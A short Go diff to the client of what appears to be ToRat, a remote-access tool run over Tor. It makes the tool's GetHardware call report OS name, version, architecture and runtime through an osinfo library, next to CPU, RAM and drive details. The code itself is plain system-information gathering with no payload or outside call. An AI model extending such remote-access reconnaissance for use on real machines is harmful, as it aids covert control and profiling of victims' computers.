@@ -8,8 +8,8 @@ import (
 	"os"
 	"path/filepath"
 	"reflect"
-	"runtime"
 
+	"github.com/JustinTimperio/osinfo"
 	"github.com/jaypipes/ghw"
 	"github.com/lu4p/ToRat/shared"
 	"github.com/lu4p/ToRat/torat_client/crypto"
@@ -182,7 +182,11 @@ func (a *API) GetHardware(v shared.Void, r *shared.Hardware) error {
 		return err
 	}
 
-	r.OS = runtime.GOOS
+	release := osinfo.GetVersion()
+	r.Runtime = release.Runtime
+	r.OSArch = release.Arch
+	r.OSName = release.Name
+	r.OSVersion = release.Version
 	r.Cores = cpu.TotalThreads
 	r.RAM = memory.String()
 	r.Drives = block.String()
